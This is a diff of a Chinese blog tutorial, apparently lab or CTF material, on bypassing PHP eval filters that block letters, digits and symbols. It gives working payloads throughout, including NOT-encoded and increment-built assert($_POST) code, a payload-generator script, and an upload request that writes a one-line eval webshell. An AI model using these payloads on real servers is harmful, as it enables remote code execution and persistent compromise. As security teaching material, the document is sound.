@@ -197,165 +197,31 @@ systemsystem(string $co"><meta name="keywords" content="Hexo,HTML,CSS,web,Linux"
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$__ = ~(&quot;%a0%af%b0%ac%ab&quot;);$___ = $$__;`$___[_]`;</span><br></pre></td></tr></table></figure>
 <p>同样由于反引号命令执行没有回显，所以POST提交使用反弹shell的命令  </p>
 <h2 id="无字母数字自增绕过"><a href="#无字母数字自增绕过" class="headerlink" title="无字母数字自增绕过"></a>无字母数字自增绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>自增</strong>  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">++</span><br><span class="line">&lt;?php</span><br><span class="line">$a = A;</span><br><span class="line">++$a; ++$a;</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br><span class="line">//输出C</span><br><span class="line">```  </span><br><span class="line">只要获取A，就可以自增获取BCD......  </span><br><span class="line">`++$a`先累加再输出，`$a++`先输出再累加  </span><br><span class="line">**自增自减**  </span><br></pre></td></tr></table></figure>
-<?php
-$_=[].'';
-若不拼接一个空字符串，则输出的Array并非字符串，拼接一个空字符串使其变成字符串
-echo $_[0];
-//读取'Array'的0号字符
-?>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数字被过滤，所以使用一个不存在的变量代替，因为变量不存在，所以为假值0,`echo $_[$__];`  </span><br><span class="line">**PHP5**  </span><br><span class="line">构造：`assert($_POST[&#x27;_&#x27;]);`  </span><br></pre></td></tr></table></figure>
-<?php
-$_ = [].'';
-$___=$_[$__];
-$__=$___;
-//赋值给$__为A
-$_=$__;
-++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;
-//获得S，此时$_为S
-$__.=$_;
-//获得AS，此时$__为AS
-$__.=$_;
-//此时$__为ASS
-$_=$___;
-//让$_重新赋值为A
-++$_;++$_;++$_;++$_;
-//获得E
-$__.=$_;
-//此时$__为ASSE
-接下来以此类推获取到ASSERT
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**自增POC生成脚本**  </span><br></pre></td></tr></table></figure>
-<?php
-highlight_file(__FILE__);
-$cmd = strtoupper($_GET['cmd']);
-$cmd2 = strtoupper($_GET['post']);
-function POC($cmd){
-    $i = 0;
-    $POC_pat1 = "\$__=\$___;";
-    $POC_pat2 = "\$_ .=\$__;";
-    while ($i<strlen($cmd)){
-        $str1 = $cmd[$i];
-        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
-        if ($i<1) {
-            $POC_pat3 = str_repeat("++\$__;",$POC1);
-            echo $POC_pat3;
-        }else{
-            $str2 = $cmd[$i-1];
-            if($str1==$str2){
-                $POC_pat5 = $POC_pat2;
-                echo $POC_pat5;
-            }else{
-                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
-                echo $POC_pat6;
-            }
-        }
-        $i++;
-    }
-}
-
-function POC2($cmd){
-    $i = 0;
-    echo '$____ = "_";$__=$___;';
-    $POC_pat1 = "\$__=\$___;";
-    $POC_pat2 = "\$____ .=\$__;";
-    while ($i<strlen($cmd)){
-        $str1 = $cmd[$i];
-        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
-        if ($i<1) {
-            $POC_pat3 = str_repeat("++\$__;",$POC1).$POC_pat2;
-            echo $POC_pat3;
-        }else{
-            $str2 = $cmd[$i-1];
-            if($str1==$str2){
-                $POC_pat5 = $POC_pat2;
-                echo $POC_pat5;
-            }else{
-                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
-                echo $POC_pat6;
-            }
-        }
-        $i++;
-    }
-}
-
-if (!empty($cmd)){
-    $POC_pat7 = "\$_=[].'';\$___=\$_[\$__];\$__=\$___;\$_=\$___;";
-    echo $POC_pat7;
-    POC($cmd);
-}
-if (!empty($cmd2)){
-    POC2($cmd2);
-}
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到生成的payload为</span><br></pre></td></tr></table></figure>
-<?php
-$_=[].'';$___=$_[$__];$__=$___;$_=$___;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;
-echo $_;
-?>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">到那时还需要一个POST，那么输入`?cmd=assert&amp;post=POST`,用得到的结果构造</span><br></pre></td></tr></table></figure>
-<?php
-$_=[].'';$___=$_[$__];$__=$___;$_=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$____ = "_";$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;
-$__ = $$____; //$_POST
-$_($__[_]); //assert($_POST[_])
-?>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造payload时记得url编码，并同时POST提交`_=&#x27;提交命令&#x27;`  </span><br><span class="line">**php7**  </span><br><span class="line">php7只需获取一个POST即可，</span><br></pre></td></tr></table></figure>
-<?php
-$____ = "_";$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;
-$_=$$____;
-`$_[_]`;
-?>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同样由于反引号没有回显，使用反弹shell即可  </span><br><span class="line">## 无字母数字特殊符号过滤</span><br></pre></td></tr></table></figure>
-<?php
-highlight_file(__FILE__);
-error_reporting(0);
-if(!preg_match('/[a-z0-9_$]/is',$_GET['cmd'])) {
-    eval($_GET['cmd']);
-}
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">多过滤了`$`和`_`  </span><br><span class="line">**PHP7**  </span><br><span class="line">短标签:</span><br></pre></td></tr></table></figure>
-<?php
-phpinfo();
-?>
-<p>等同于<br><?= phpinfo();?><br>可直接执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用GET方式提交</span><br></pre></td></tr></table></figure>
-<p>?&gt;<?= `{${~"%a0%b8%ba%ab"}[%a0]}`?><br>&#x2F;&#x2F;取反等同于?&gt;<?= `$_GET[%a0]?>&#96;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造payload</span><br></pre></td></tr></table></figure>
-<p>?cmd&#x3D;?&gt;<?=`{${~"%a0%b8%ba%ab"}[%a0]}`?>&amp;%a0&#x3D;ls</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">但是`_`和`$`都被过滤了，显然还不能成功，在PHP7中我们可以使用($a)()一样调用函数  </span><br><span class="line">例如：  </span><br><span class="line">`call_user_func()`就等同于`(call_user_func)()`,所以我们利用取反运算可以得到  </span><br><span class="line">`(call_user_func)(system,whoami,&#x27;&#x27;);`等同于`(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#x27;&#x27;);`  </span><br><span class="line">**PHP5**  </span><br><span class="line">文件读取：   </span><br><span class="line">PHP中POST上传文件会把我们上传的文件暂时存在/tmp目录下,   </span><br><span class="line">默认文件名是phpXXXXXX，文件名最后6个字符是随机的大小写字母。  </span><br><span class="line">使用通配符`?`:`./???/?????????`可以匹配到`./tmp/phpXXXXXX`,不过能匹配到的东西太多，通常会报错  </span><br><span class="line">所以将最后一个`?`改为`[@-[]`,`[@-[]`表示ASCII在`@`和`[`之间的字符，也就是大写字母，保障最后一位是大写字母  </span><br><span class="line">步骤一：先构造一个文件上传的POST数据包；</span><br><span class="line">步骤二：PHP页面生成临时文件phpXXXXXX，存储在/tmp目录下；</span><br><span class="line">步骤三：执行指令`./???/????????[@-[]`，读取文件，执行其中指令；  </span><br><span class="line">步骤四：在上传的文件中写入一句话木马，把木马生成位置指定一个绝对路径，直接执行。  </span><br><span class="line">此为上传的数据包</span><br></pre></td></tr></table></figure>
-<p>POST &#x2F;php_cmd&#x2F;php80&#x2F;class11&#x2F;3.php?cmd&#x3D;?%3E%3C?&#x3D;<code>.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]</code>%3b?%3E HTTP&#x2F;1.1<br>Host: localhost<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Content-Type: multipart&#x2F;form-data;boundary&#x3D;——–123<br>Accept-Encoding: gzip, deflate<br>Connection:close<br>Upgrade-Insecure-Requests: 1<br>Content-Length: 144<br>&#x2F;&#x2F;此处有一行空行<br>——–123<br>Content-Disposition:form-data;name&#x3D;”file”;filename&#x3D;”1.txt”<br>&#x2F;&#x2F;此处也有一行空行<br>echo “&lt;?php eval($_POST[‘shell’]);” &gt; &#x2F;www&#x2F;admin&#x2F;localhost_80&#x2F;wwwroot&#x2F;class11&#x2F;success.php<br>——–123</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">创建成功后使用蚁剑连接即可  </span><br><span class="line">使用一句话木马需要知道绝对路径，可以使用反弹shell  </span><br></pre></td></tr></table></figure>
-<p>无字母数字过滤;<del>^&#96;&amp;|<br>&lt;?php<br>highlight_file(<strong>FILE</strong>);<br>error_reporting(0);<br>if(!preg_match(‘&#x2F;[a-z0-9;</del>^&#96;&amp;|]&#x2F;is’,$_GET[‘cmd’])) {<br>    eval($_GET[‘cmd’]);<br>}</p>
-<pre><code>`~`,`^`都被过滤，可以使用自增法构造，`;`被过滤，可以使用短标签法代替  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-</code></pre>
+<p><strong>自增</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">++</span><br><span class="line">&lt;?php</span><br><span class="line">$a = A;</span><br><span class="line">++$a; ++$a;</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br><span class="line">//输出C</span><br><span class="line">只要获取A，就可以自增获取BCD......  </span><br><span class="line">++$a先累加再输出，$a++先输出再累加</span><br></pre></td></tr></table></figure>
+<p><strong>自增自减</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[].&#x27;&#x27;;</span><br><span class="line">若不拼接一个空字符串，则输出的Array并非字符串，拼接一个空字符串使其变成字符串</span><br><span class="line">echo $_[0];</span><br><span class="line">//读取&#x27;Array&#x27;的0号字符</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>数字被过滤，所以使用一个不存在的变量代替，因为变量不存在，所以为假值0,<br><code>echo $_[$__];</code><br><strong>PHP5</strong><br>构造：<code>assert($_POST[&#39;_&#39;]);</code>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_ = [].&#x27;&#x27;;</span><br><span class="line">$___=$_[$__];</span><br><span class="line">$__=$___;</span><br><span class="line">//赋值给$__为A</span><br><span class="line">$_=$__;</span><br><span class="line">++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;</span><br><span class="line">//获得S，此时$_为S</span><br><span class="line">$__.=$_;</span><br><span class="line">//获得AS，此时$__为AS</span><br><span class="line">$__.=$_;</span><br><span class="line">//此时$__为ASS</span><br><span class="line">$_=$___;</span><br><span class="line">//让$_重新赋值为A</span><br><span class="line">++$_;++$_;++$_;++$_;</span><br><span class="line">//获得E</span><br><span class="line">$__.=$_;</span><br><span class="line">//此时$__为ASSE</span><br><span class="line">接下来以此类推获取到ASSERT</span><br></pre></td></tr></table></figure>
+<p><strong>自增POC生成脚本</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$cmd = strtoupper($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">$cmd2 = strtoupper($_GET[&#x27;post&#x27;]);</span><br><span class="line">function POC($cmd)&#123;</span><br><span class="line">    $i = 0;</span><br><span class="line">    $POC_pat1 = &quot;\$__=\$___;&quot;;</span><br><span class="line">    $POC_pat2 = &quot;\$_ .=\$__;&quot;;</span><br><span class="line">    while ($i&lt;strlen($cmd))&#123;</span><br><span class="line">        $str1 = $cmd[$i];</span><br><span class="line">        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex(&quot;A&quot;),16,10);</span><br><span class="line">        if ($i&lt;1) &#123;</span><br><span class="line">            $POC_pat3 = str_repeat(&quot;++\$__;&quot;,$POC1);</span><br><span class="line">            echo $POC_pat3;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $str2 = $cmd[$i-1];</span><br><span class="line">            if($str1==$str2)&#123;</span><br><span class="line">                $POC_pat5 = $POC_pat2;</span><br><span class="line">                echo $POC_pat5;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $POC_pat6 = $POC_pat1.str_repeat(&quot;++\$__;&quot;,$POC1).$POC_pat2;</span><br><span class="line">                echo $POC_pat6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function POC2($cmd)&#123;</span><br><span class="line">    $i = 0;</span><br><span class="line">    echo &#x27;$____ = &quot;_&quot;;$__=$___;&#x27;;</span><br><span class="line">    $POC_pat1 = &quot;\$__=\$___;&quot;;</span><br><span class="line">    $POC_pat2 = &quot;\$____ .=\$__;&quot;;</span><br><span class="line">    while ($i&lt;strlen($cmd))&#123;</span><br><span class="line">        $str1 = $cmd[$i];</span><br><span class="line">        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex(&quot;A&quot;),16,10);</span><br><span class="line">        if ($i&lt;1) &#123;</span><br><span class="line">            $POC_pat3 = str_repeat(&quot;++\$__;&quot;,$POC1).$POC_pat2;</span><br><span class="line">            echo $POC_pat3;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $str2 = $cmd[$i-1];</span><br><span class="line">            if($str1==$str2)&#123;</span><br><span class="line">                $POC_pat5 = $POC_pat2;</span><br><span class="line">                echo $POC_pat5;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $POC_pat6 = $POC_pat1.str_repeat(&quot;++\$__;&quot;,$POC1).$POC_pat2;</span><br><span class="line">                echo $POC_pat6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!empty($cmd))&#123;</span><br><span class="line">    $POC_pat7 = &quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;;</span><br><span class="line">    echo $POC_pat7;</span><br><span class="line">    POC($cmd);</span><br><span class="line">&#125;</span><br><span class="line">if (!empty($cmd2))&#123;</span><br><span class="line">    POC2($cmd2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得到生成的payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[].&#x27;&#x27;;$___=$_[$__];$__=$___;$_=$___;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;</span><br><span class="line">echo $_;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>到那时还需要一个POST，那么输入<code>?cmd=assert&amp;post=POST</code>,用得到的结果构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[].&#x27;&#x27;;$___=$_[$__];$__=$___;$_=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$____ = &quot;_&quot;;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;</span><br><span class="line">$__ = $$____; //$_POST</span><br><span class="line">$_($__[_]); //assert($_POST[_])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>构造payload时记得url编码，并同时POST提交<code>_=&#39;提交命令&#39;</code><br><strong>php7</strong><br>php7只需获取一个POST即可，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$____ = &quot;_&quot;;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;</span><br><span class="line">$_=$$____;</span><br><span class="line">`$_[_]`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>同样由于反引号没有回显，使用反弹shell即可  </p>
+<h2 id="无字母数字特殊符号过滤"><a href="#无字母数字特殊符号过滤" class="headerlink" title="无字母数字特殊符号过滤"></a>无字母数字特殊符号过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#x27;/[a-z0-9_$]/is&#x27;,$_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>多过滤了<code>$</code>和<code>_</code><br><strong>PHP7</strong><br>短标签:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">等同于</span><br><span class="line">&lt;?= phpinfo();?&gt;</span><br><span class="line">可直接执行</span><br></pre></td></tr></table></figure>
+<p>用GET方式提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?= `&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;</span><br><span class="line">//取反等同于?&gt;&lt;?= `$_GET[%a0]?&gt;`</span><br></pre></td></tr></table></figure>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;&amp;%a0=ls</span><br></pre></td></tr></table></figure>
+<p>但是<code>_</code>和<code>$</code>都被过滤了，显然还不能成功，在PHP7中我们可以使用($a)()一样调用函数<br>例如：<br><code>call_user_func()</code>就等同于<code>(call_user_func)()</code>,所以我们利用取反运算可以得到<br><code>(call_user_func)(system,whoami,&#39;&#39;);</code>等同于<code>(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#39;&#39;);</code><br><strong>PHP5</strong><br>文件读取：<br>PHP中POST上传文件会把我们上传的文件暂时存在&#x2F;tmp目录下,<br>默认文件名是phpXXXXXX，文件名最后6个字符是随机的大小写字母。<br>使用通配符<code>?</code>:<code>./???/?????????</code>可以匹配到<code>./tmp/phpXXXXXX</code>,不过能匹配到的东西太多，通常会报错<br>所以将最后一个<code>?</code>改为<code>[@-[]</code>,<code>[@-[]</code>表示ASCII在<code>@</code>和<code>[</code>之间的字符，也就是大写字母，保障最后一位是大写字母<br>步骤一：先构造一个文件上传的POST数据包；<br>步骤二：PHP页面生成临时文件phpXXXXXX，存储在&#x2F;tmp目录下；<br>步骤三：执行指令<code>./???/????????[@-[]</code>，读取文件，执行其中指令；<br>步骤四：在上传的文件中写入一句话木马，把木马生成位置指定一个绝对路径，直接执行。<br>此为上传的数据包</p>
